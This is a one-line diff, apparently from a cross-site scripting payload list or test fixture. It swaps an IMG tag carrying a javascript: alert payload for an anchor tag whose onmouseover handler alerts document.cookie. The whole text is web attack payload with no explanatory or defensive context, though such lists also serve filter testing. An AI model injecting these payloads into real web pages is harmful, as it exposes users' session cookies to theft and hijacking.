@@ -1,1 +1,1 @@
-<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
